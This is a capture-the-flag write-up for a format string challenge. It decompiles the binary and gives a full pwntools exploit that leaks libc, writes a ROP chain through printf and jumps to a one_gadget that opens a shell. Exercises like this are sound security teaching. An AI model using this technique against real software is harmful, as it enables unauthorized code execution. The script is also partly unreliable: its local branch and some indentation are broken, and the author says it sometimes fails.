## ForMatt Zelinsky (461 points)

### Description

Right? What? Wear? Pants? Built on Ubuntu 20.04.

### Gathering information

We can decompile the program with Ghidra. It extracts the following pseudo-c-
code:

```c  
int main(EVP_PKEY_CTX *param_1)

{  
 char buffer [336];  
  
 init(param_1);  
 puts("Oh no!! Full RELRO, PIE enabled, and no obvious buffer overflow.:(");  
 puts("Thankfully, I\'m generous and will grant you two leaks");  
 printf("This stack leak might be useful %p\n",buffer);  
 printf("And this PIE leak might be useful %p\n",main);  
 puts("Now gimme your payload");  
 fgets(buffer,0x150,stdin);  
 printf("Is this what you meant? ");  
 printf(buffer);  
 return 0;  
}  
```

As 0x150 = 336, there is no buffer overflow. But there is indeed a format
string vulnerability ([if you have no idea what this is, check this
link](https://www.youtube.com/watch?v=CyazDp-Kkr0)) as the program uses
`printf` on our input buffer without any check.

### Exploitation

The idea is the following: we can use the format string vulnerability to write
and execute a ropchain. Having this in mind, it's relatively simple to exploit
the vulnerability.

```python  
#!/usr/bin/env python3

from pwn import *

HOST = "challenges.ctfd.io"  
PORT = 30042

exe = ELF("./formatz")

context.binary = exe  
context.log_level = "debug"

def conn():  
   if args.LOCAL:  
       libc = ELF('/usr/lib/libc-2.33.so', checksec=False)  
       return process([exe.path])  
   else:  
       libc = ELF('./libc6_2.31-0ubuntu9.2_amd64.so', checksec=False)  
       return remote(HOST, PORT), libc

def exec_fmt(payload):  
   p = process([exe.path])  
   p.sendline(payload)  
   return p.recvall()

def main():

   # good luck pwning :)

   # Determine format string offset automatically (thx pwntools <3)  
   autofmt = FmtStr(exec_fmt)  
   offset = autofmt.offset  
log.info(f'Format string offset: {offset}')  
  
   io, libc = conn()

   buff_len = 0x150

   # --------------------------------------------------- #  
   # ------------------- leaking libc ------------------ #  
   # --------------------------------------------------- #  
  
   # Recieve the leaks  
   io.recvuntil('This stack leak might be useful ')  
   stack_leak = int(io.recvline()[2:-1], 16)  
log.info(f"stack @ {hex(stack_leak)}")  
   io.recvuntil('And this PIE leak might be useful ')  
   main_leak = int(io.recvline()[2:-1], 16)  
   exe.address = main_leak - exe.symbols['main']  
log.info(f"base address @ {hex(exe.address)}")  
  
   # The offset to RIP is calculated as following  
   rip = stack_leak + buff_len + 8 # 8 = RBP length!  
  
   # We make use of this useful gadget  
   pop_rdi = exe.address + 0x00000000000012bb # pop rdi; ret;

   # We now use the format string vulnerability to write and execute a
ropchain  
   # Overwrite EIP with whatever we want and use it to leak LIBC.  
   # In order to leak libc we execute puts with a function's GOT entry address
as an argument.  
   # This way puts will print out, as a string, the address of the function
inside libc.  
   #  
   # Notice that, after leaking LIBC base address, we return to main.  
   # This is done to make it simple to execute another ropchain from a clear
environment!  
   #  
   # Note: we use the function provided by pwntools because:  
   #    - I'm lazy  
   #    - It would be a hell of calculations to do this by hand  
   leak_func = 'setvbuf'  
   payload = fmtstr_payload(offset, {rip: pop_rdi, rip+8: exe.got[leak_func],
rip+16: exe.symbols['puts'], rip+24: exe.symbols['main']}, write_size='short')  
  
   # Send payload...  
   io.sendline(payload)

   # ...and recieve the leak  
   io.recvuntil('\x7f')  
   libc_leak = u64(io.recvuntil('\x7f').ljust(8, b'\x00'))  
log.info(f'{leak_func} @ {hex(libc_leak)}')  
  
   # Set the base address of libc, based on the leak  
   # Notice that the correct libc version was determined by leaking different
functions  
   # and using the online libc database https://libc.blukat.me/  
   libc.address = libc_leak - libc.symbols[leak_func]  
log.info(f'libc base @ {hex(libc.address)}')  
  
   # --------------------------------------------------- #  
   # ---------------- execve('/bin/sh') ---------------- #  
   # --------------------------------------------------- #  
  
   # Same as above, get leaks  
   io.recvuntil('This stack leak might be useful ')  
   stack_leak = int(io.recvline()[2:-1], 16)  
log.info(f"stack @ {hex(stack_leak)}")  
   io.recvuntil('And this PIE leak might be useful ')  
   main_leak = int(io.recvline()[2:-1], 16)  
   exe.address = main_leak - exe.symbols['main']  
log.info(f"base address @ {hex(exe.address)}")  
  
   # Re-calculate rip address  
   # The gadget positions stays the same (and we don't need it anyway)  
   rip = stack_leak + buff_len + 8  
  
   # Overwrite EIP with a onegadget that executes execve('/bin/sh', NULL,
NULL) under some constraint.  
   # A onegadget is basically a sequence of instructions in a certain libc
that makes the execve('/bin/sh', NULL, NULL) syscall.  
   # I don't usually check if the given constraints are respected, I just try
them.  
   #  
   # $ onegadget libc6_2.31-0ubuntu9.2_amd64.so  
   # 0xe6c7e execve("/bin/sh", r15, r12)  
   # constraints:  
   #   [r15] == NULL || r15 == NULL  
   #   [r12] == NULL || r12 == NULL  
   #  
   # 0xe6c81 execve("/bin/sh", r15, rdx)  
   # constraints:  
   #   [r15] == NULL || r15 == NULL  
   #   [rdx] == NULL || rdx == NULL  
   #  
   # 0xe6c84 execve("/bin/sh", rsi, rdx)  
   # constraints:  
   #   [rsi] == NULL || rsi == NULL  
   #   [rdx] == NULL || rdx == NULL  
  
   # Send the payload  
   onegadget = libc.address + 0xe6c81  
   payload = fmtstr_payload(offset, {rip: onegadget})  
   io.sendline(payload)

   # Profit  
   io.interactive()

if __name__ == "__main__":  
   main()

```

Notice that this exploit sometimes fails to execute for unknown reasons.

### The Flag

We can then `cat flag.txt` and get the flag: `UDCTF{write-what-wear-
pantz-660714392699745151725739719383302481806841115893230100153376}`

### Conclusions

I usually dislike format string vulnerabilities. They are tedious and, let me
say this, dumb. Even the compiler knows that you are doing something wrong and
gives you a warning if you attempt to compile something with a format string
vulnerability in it.

Nonetheless, I enjoyed this challenge a lot. Executing a ropchain via format
string was very funny and a good learning experience.